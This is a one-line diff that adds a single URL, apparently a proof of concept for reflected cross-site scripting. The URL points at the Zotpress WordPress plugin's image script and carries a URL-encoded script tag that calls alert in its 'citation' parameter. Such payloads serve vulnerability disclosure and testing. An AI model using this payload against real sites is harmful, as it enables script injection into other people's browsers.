@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/zotpress/zotpress.image.php?citation=%3cscript%3ealert(0)%3c%2fscript%3e
